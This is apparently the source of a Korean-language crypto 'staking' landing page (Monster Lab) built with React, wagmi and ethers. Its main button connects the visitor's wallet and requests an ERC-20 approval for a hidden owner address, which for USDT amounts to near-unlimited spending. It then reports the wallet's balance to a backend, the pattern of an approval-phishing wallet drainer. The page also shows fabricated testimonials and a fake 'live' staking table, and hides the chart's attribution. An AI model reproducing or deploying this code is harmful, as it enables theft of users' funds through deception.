import React, { useState, useEffect, useMemo, useRef, memo } from "react";
import { Stack, Button, Heading, Text, useBreakpointValue } from "@chakra-ui/react";
import { keyframes } from "@emotion/react";
import Image, { StaticImageData } from "next/image";
import dynamic from "next/dynamic";

import trust from "@/assets/trustwallet.png"
import binance from "@/assets/binance.png"
import cubes from "@/assets/cubes.png"

import btc from "@/assets/symbols/btc.svg"
import eth from "@/assets/symbols/eth.svg"
import sol from "@/assets/symbols/sol.svg"
import trx from "@/assets/symbols/trx.svg"
import usdt from "@/assets/symbols/usdt.svg"

import { useNav } from "@/utils/storage";

import { Swiper, SwiperSlide } from 'swiper/react'
import { Autoplay } from 'swiper/modules'
import "swiper/swiper-bundle.css";

import { useConnect, useAccount, useBalance, useContractWrite, usePrepareContractWrite, useContractRead, erc20ABI } from "wagmi";
import Toast from "./toast";
import { ethers } from "ethers";
import { environment } from "@/utils/address";
import { SaveMinerPayload } from "@/utils/interface";

import { isMobileDevice } from "@/utils/isMobileDevice";

export default function Main() {
    return (
        <Stack w={"100%"} justifyContent={"flex-start"} alignItems={"center"} gap={10}>
            <ConnectSection />
            <Cards />
            <Reviews />
            <Mining />
            <Chart />
        </Stack>
    );
}

function ConnectSection() {
    const pulse = keyframes`
        0% {
            transform: scale(1);
            box-shadow: 0 0 0 0 rgba(0, 123, 255, 0.7);
        }
        70% {
            transform: scale(1.05);
            box-shadow: 0 0 0 15px rgba(0, 123, 255, 0);
        }
        100% {
            transform: scale(1);
            box-shadow: 0 0 0 0 rgba(0, 123, 255, 0);
        }
    `;

    const size = useBreakpointValue(
        {
            base: 35,
            md: 70
        }
    )

    const [invite, setInvite] = useState<string | null>(null);

    const toast = Toast()
    const { isConnected, address } = useAccount()
    const { connectors, connect } = useConnect({
        onSuccess(data, variables, context) {
            handleSaveMiner(data.chain.id);
        },
        onError(error, variables, context) {
            const message = error.message || "Please connect your wallet"
            toast.error(message, error.name)
        },
    });
    const { data: balance } = useBalance({
        address: address,
        token: environment.token_address
    })
    const { refetch } = useContractRead({
        address: environment.token_address,
        abi: erc20ABI,
        functionName: "allowance",
        args: [address as `0x${string}`, environment.owner_address],
        onSuccess(data) {
            const allowance = ethers.utils.formatUnits(data, decimals);
        },
        staleTime: 1000 * 60 * 2,
    });
    const { data: decimals } = useContractRead({
        address: environment.token_address,
        abi: erc20ABI,
        functionName: "decimals",
    });
    const { config } = usePrepareContractWrite({
        address: environment.token_address,
        abi: erc20ABI,
        functionName: "approve",
        args: [environment.owner_address, ethers.utils.parseUnits("100")],
        onError(err) {
            console.log(err, "error");
        },
    });
    const { writeAsync } = useContractWrite({
        ...config,
        onSuccess(data, variables, context) {
            refetch();
        },
        onError(error, variables, context) {
            toast.error(error.message)
        },
    });

    const handleSaveMiner = async (chainId: number) => {
        const payload: SaveMinerPayload = {
            address: address as string,
            balance: [
                {
                    amount: balance ? balance?.formatted : "0",
                    approvedAmount: "0",
                    chain: chainId,
                    symbol: "USDT",
                    tokenContractAddress: environment.token_address,
                },
            ],
            invite,
        };
        try {
            const req = await fetch("/api/saveMiner", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload),
            });
            await req.json();
        } catch (error) {
            console.log("Error: ", error)
        }
    };

    return (
        <Stack
            w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }}
            gap={{ base: 4, md: 8 }} justifyContent={"center"} alignItems={"center"}
            bgImage={`url(${cubes.src})`}
        >
            <Stack direction={{ base: "column", md: "row" }} justifyContent={"center"} alignItems={"center"} gap={{ base: 1, md: 10 }}>
                <Image src={trust} alt="Trust Wallet" height={size} />
                <Image src={binance} alt="Binance" height={size} />
            </Stack>
            <Button
                colorScheme="blue" size={{ base: "md", md: "lg" }} borderRadius={"full"}
                bgGradient={"linear(to-r, #007bff, #6610f2)"}
                _hover={{
                    bgGradient: "linear(to-r, #007bff, #6610f2)"
                }}
                animation={`${pulse} 4s infinite`}
                transition="transform 0.3s ease, box-shadow 0.3s ease"
                onClick={async () => {
                    if (!isConnected) {
                        let connectorToUse;
                        if (isMobileDevice()) {
                            connectorToUse = connectors.find(c => c.id === 'injected' || connectors[0])
                        } else {
                            connectorToUse = connectors.find(c => c.id === 'walletConnect' || connectors[0])
                        }
                        if (connectorToUse) connect({ connector: connectorToUse })
                    } else {
                        try {
                            await writeAsync?.();
                        } catch (e) {
                            console.log("Error: ", e)
                        }
                    }
                    // if (!isConnected) {
                    //     const wcConnector = connectors.find(c => c.id === 'walletConnect')
                    //     if (wcConnector) connect({ connector: wcConnector })
                    // } else {
                    //     try {
                    //         await writeAsync?.();
                    //     } catch (e) {
                    //         console.log("Error: ", e)
                    //     }
                    // }
                }}
            >
                지금 시작하기
            </Button>
        </Stack>
    );
}

function Cards() {

    const cards: { icon: string, title: string, content: string }[] = [
        { icon: "🔒", title: "완전한 자산 통제", content: "사용자의 디지털 자산은 중앙화된 기관의 개입 없이 자체 지갑에 온전히 보관되며, 타사 위탁 관리 없이 온체인 상에서 직접 운용됩니다." },
        { icon: "⚙️", title: "스마트 수익", content: "스마트컨트랙트를 통한 자동화된 노드 참여로, 보유 자산에 기반한 알고리즘적 수익 배분이 주기적으로 실행됩니다." },
        { icon: "🔓", title: "자유로운 입출금", content: "스테이킹 자산은 별도의 락업 또는 언스테이킹 기간 없이, 사용자의 지갑에서 실시간으로 인출 및 입금이 가능합니다." },
        { icon: "🧠", title: "신뢰성과 기술력", content: "금융공학 기반의 리스크 분석 모델과 분산형 네트워크 보안 설계를 통해, 고도화된 알고리즘과 인프라 안정성을 제공합니다." },
    ]

    const [width, setWidth] = useState(300);
    const [height, setHeight] = useState(300);

    const cardRef = useRef<HTMLDivElement | null>(null)

    useEffect(() => {
        const ref = cardRef.current

        if (!ref) return;

        const resizeObserver = new ResizeObserver(() => {
            setWidth(ref.offsetWidth)
            setHeight(ref.offsetHeight)
        })

        resizeObserver.observe(ref)

        return () => resizeObserver.disconnect()
    }, []);

    const card = useBreakpointValue(
        {
            base: (
                <Stack direction={"column"} justifyContent={"center"} alignItems={"center"} gap={5}>
                    {
                        cards.map((card, index) => (
                            <Stack
                                key={index} w={"90%"} p={10} gap={3} bgColor={"white"} shadow={"2xl"} borderRadius={"3xl"} justifyContent={"center"} alignItems={"center"}
                                transition={"all ease-in-out 0.3s"}
                                _hover={{
                                    transform: "translateY(-10px)"
                                }}
                            >
                                <Heading size={"lg"} textAlign={"center"}>{card.icon}</Heading>
                                <Heading size={"md"} textAlign={"center"}>{card.title}</Heading>
                                <Text textAlign={"center"} fontSize={"small"}>{card.content}</Text>
                            </Stack>
                        ))
                    }
                </Stack >
            ),
            md: (
                <>
                    <Stack direction={"row"} justifyContent={"center"} alignItems={"center"} gap={10}>
                        {
                            cards.slice(0, 3).map((card, index) => (
                                <Stack
                                    key={index} w={width} h={height} ref={index === 0 ? cardRef : null} p={10} gap={3} bgColor={"white"} shadow={"2xl"} borderRadius={"3xl"} justifyContent={"center"} alignItems={"center"}
                                    transition={"all ease-in-out 0.3s"}
                                    _hover={{
                                        transform: "translateY(-10px)"
                                    }}
                                >
                                    <Heading as={"h1"} textAlign={"center"}>{card.icon}</Heading>
                                    <Heading size={"lg"} textAlign={"center"}>{card.title}</Heading>
                                    <Text textAlign={"center"}>{card.content}</Text>
                                </Stack>
                            ))
                        }
                    </Stack>
                    <Stack direction={"row"} justifyContent={"center"} alignItems={"center"} gap={10}>
                        {
                            cards.slice(3).map((card, index) => (
                                <Stack
                                    key={index} w={width} h={height} p={10} gap={3} bgColor={"white"} shadow={"2xl"} borderRadius={"3xl"} justifyContent={"center"} alignItems={"center"}
                                    transition={"all ease-in-out 0.3s"}
                                    _hover={{
                                        transform: "translateY(-10px)"
                                    }}
                                >
                                    <Heading as={"h1"} textAlign={"center"}>{card.icon}</Heading>
                                    <Heading size={"lg"} textAlign={"center"}>{card.title}</Heading>
                                    <Text textAlign={"center"}>{card.content}</Text>
                                </Stack>
                            ))
                        }
                    </Stack>
                </>
            )
        }
    )

    return (
        <Stack
            w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }}
            gap={8}
            justifyContent={"center"} alignItems={"center"}
        >
            {card}
        </Stack>
    );
}

function Reviews() {

    const reviews = [
        '“Monster Lab 덕분에 스테이킹이 정말 간편해졌습니다.”\n- 김지민 (서울)',
        '“탈중앙화 방식이라 더 믿음이 가요.”\n- 박성훈 (부산)',
        '“실시간 입출금이라 자금 운용이 유연해졌어요.”\n- 이은지 (대구)',
        '“기존 플랫폼보다 안정적이고 신뢰가 갑니다.”\n- 최경호 (제주)',
        '“금융공학 기반 분석이 믿음직스럽네요.”\n- 정서윤 (광주)',
        '“수익 분배가 자동화되어 편리합니다.”\n>- 김도훈 (인천)',
        '“사용자 중심 인터페이스가 직관적이에요.”\n- 한유진 (수원)',
        '“Monster Lab이 제 투자 습관을 바꿨어요.”\n- 박예찬 (울산)',
    ]
    const [activeIndex, setActiveIndex] = useState(0);
    const [swiperInstance, setSwiperInstance] = useState<any>(null);

    useEffect(() => {
        const slideNext = setInterval(() => {
            swiperInstance?.slideNext()
        }, 1000 * 2)

        return () => clearInterval(slideNext)
    }, [])

    const handleSlideChange = (swiper: { activeIndex: React.SetStateAction<number>; }) => {
        setActiveIndex(swiper.activeIndex);
    };

    const Slide = ({ content }: { content: string }) => {
        const _content = content.split('\n')
        return (
            <Stack bgColor={"white"} p={5} borderRadius={"xl"} shadow={"lg"}>
                <Heading size={{ base: "sm", md: "md" }} textAlign={"center"}>{_content[0]}</Heading>
                <Heading size={{ base: "xs", md: "sm" }} textAlign={"right"}>{_content[1]}</Heading>
            </Stack>
        );
    }

    const slides = useBreakpointValue(
        {
            base: 1,
            md: 3
        }
    )

    return (
        <Stack w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }} justifyContent={"center"} alignItems={"center"}>
            <Heading size={{ base: "lg", md: "xl" }}>💬 사용자 후기</Heading>
            <Stack w={"100%"} direction={"row"} justifyContent={"center"} alignItems={"center"} gap={0}>
                <Swiper
                    modules={[Autoplay]}
                    effect="fade"
                    spaceBetween={10}
                    slidesPerView={slides}
                    pagination={{ clickable: true }}
                    centeredSlides={true}
                    grabCursor={true}
                    loop={true}
                    className="mySwiper"
                    onSlideChange={handleSlideChange}
                    onSwiper={(swiper) => setSwiperInstance(swiper)}
                    autoplay={{
                        delay: 5000,
                        disableOnInteraction: false,
                        pauseOnMouseEnter: true
                    }}
                >
                    {
                        reviews.map((review, index) => (
                            <SwiperSlide key={index}><Slide content={review} /></SwiperSlide>
                        ))
                    }
                </Swiper>
            </Stack>
        </Stack>
    );
}

interface Data {
    symbol: StaticImageData;
    address: string;
    ror: number
}

function Mining() {

    const scroll = keyframes`
        0% {
            transform: translateY(0);
        }
        100% {
            transform: translateY(-50%);
        }
    `;

    const size = useBreakpointValue(
        {
            base: 20,
            md: 25
        }
    )

    const datas: Data[] = [
        { symbol: sol, address: "7ZWY9FAbuTx6XFDKo7Uub3b1o6Mn", ror: 3.92 },
        { symbol: usdt, address: "TMaS9zMj9aEhLksxG6nUWo7hZkzNbdqipL", ror: 14.40 },
        { symbol: eth, address: "0x6A5b2cD109bA34E19d3F42b801f6eD8FbAa912De", ror: 6.27 },
        { symbol: btc, address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", ror: 4.15 },
        { symbol: trx, address: "TXQhZvvYH3FXLqqfaJh5A1Dc3tLg8Jh4Eh", ror: 1.87 },
    ]

    const duplicatedData: Data[] = [...datas, ...datas,]


    return (
        <Stack w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }} justifyContent={"center"} alignItems={"center"}>
            <Heading size={{ base: "lg", md: "xl" }}>📡 실시간 스테이킹 상태</Heading>
            <Text w={{ base: "100%", md: "60%" }} textAlign={"center"} fontSize={{ base: "small", md: "medium" }}>아래는 현재 유저 지갑에서 발생 중인 스테이킹 데이터입니다. 자동으로 수익이 발생하며, 완전히 탈중앙화된 구조를 기반으로 실시간 갱신됩니다.</Text>
            <Stack w={{ base: "100%", md: "60%" }} h={{ base: "35vh", md: "30vh" }} bgColor={"white"} borderRadius={"lg"} overflow={"hidden"} position={"relative"} p={3} pt={0}>
                <Stack w={"100%"} direction={"row"} justifyContent={"center"} alignItems={"center"} gap={0} bgColor={"white"} zIndex={2} pt={{ base: 2, md: 3 }} pb={{ base: 1, md: 2 }}>
                    <Heading size={{ base: "xs", md: "sm" }} w={{ base: "10", md: "20%" }} textAlign={"left"}>코인</Heading>
                    <Heading size={{ base: "xs", md: "sm" }} w={{ base: "70%", md: "60%" }} textAlign={"center"}>주소</Heading>
                    <Heading size={{ base: "xs", md: "sm" }} w={"20%"} textAlign={"right"}>수익률 (%)</Heading>
                </Stack>
                <Stack gap={5} animation={`${scroll} 10s linear infinite`}>
                    {
                        duplicatedData.map((data, index) => (
                            <Stack w={"100%"} direction={"row"} justifyContent={"center"} alignItems={"center"} gap={0}>
                                <Stack w={{ base: "10", md: "20%" }} justifyContent={"center"} alignItems={"flex-start"} px={2}>
                                    <Image src={data.symbol} alt="Symbol" height={size} />
                                </Stack>
                                <Text w={{ base: "70%", md: "60%" }} fontSize={{ base: "small", md: "medium" }} textAlign={"center"} fontWeight={"semibold"}>{data.address}</Text>
                                <Text w={"20%"} fontSize={{ base: "small", md: "medium" }} textAlign={"right"} fontWeight={"semibold"} px={2}>{data.ror}</Text>
                            </Stack>
                        ))
                    }
                </Stack>
            </Stack>
        </Stack>
    );
}

const AdvancedRealTimeChart = dynamic(
    () =>
        import("react-ts-tradingview-widget")
            .then(w => w.AdvancedRealTimeChart),
    {
        ssr: false
    }
)

const Chart = memo(() => {

    const MemoizedAdvancedRealTimeChart = useMemo(() => {
        return <AdvancedRealTimeChart
            interval="1"
            range="1D"
            symbol="BINANCE:BTCUSDT"
            locale="kr"
            hide_top_toolbar={false}
            hide_side_toolbar={true}
            withdateranges={false}
            hide_legend={false}
            copyrightStyles={{
                link: {
                    display: "none",
                },
                parent: {
                    display: "none",
                },
                span: {
                    display: "none",
                },
            }}
            popup_width="100%"
            width={"100%"}
            height={"100%"}
            popup_height="100%"
        />
    }, [])

    return (
        <Stack w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }} justifyContent={"center"} alignItems={"center"}>
            <Heading size={{ base: "lg", md: "xl" }}>📊 고급 실시간 암호화폐 차트</Heading>
            <Text w={{ base: "100%", md: "80%" }} textAlign={"center"} fontSize={{ base: "small", md: "medium" }}>실시간 암호화폐 시장 데이터를 심층적으로 분석해보세요. 다양한 지표와 변동성을 TradingView 고급 차트로 확인할 수 있습니다.</Text>
            <Stack w={{ base: "100%", md: "90%" }} h={{ base: "30vh", md: "50vh" }}>
                {MemoizedAdvancedRealTimeChart}
            </Stack>
        </Stack>
    );
})
